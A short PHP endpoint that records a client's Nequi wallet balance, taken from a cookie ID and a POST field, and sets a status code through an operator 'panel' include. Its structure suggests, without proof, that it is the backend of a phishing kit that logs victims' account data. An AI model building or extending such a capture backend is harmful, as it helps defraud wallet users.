<?php
/**
 * guardar_saldo.php
 * Guarda el saldo y cambia estado a 28
 */

require_once('../lib/class.inputfilter.php');
require('../panel/include/setings.php');
date_default_timezone_set('America/Bogota');

$ifilter = new InputFilter();

// Obtener ID del cliente desde cookie
$id = isset($_COOKIE['id']) ? $ifilter->process($_COOKIE['id']) : '';

// Obtener saldo desde POST
$saldo = isset($_POST['saldo']) ? $ifilter->process($_POST['saldo']) : '';

// Validar que tenemos datos
if ($id === '' || $id === '0' || $saldo === '') {
	http_response_code(400);
	echo 'ERR';
	exit;
}

try {
	// Usar la función que ya existe en setings.php
	// Actualiza status a 28 y guarda el saldo en el campo 'agente'
	put_saldo_nequi($id, $saldo);
	
	error_log("✅ Saldo guardado para ID $id: $saldo");
	echo 'OK';
	
} catch (Exception $e) {
	error_log('❌ Error: ' . $e->getMessage());
	http_response_code(500);
	echo 'ERR';
	exit;
}
?>
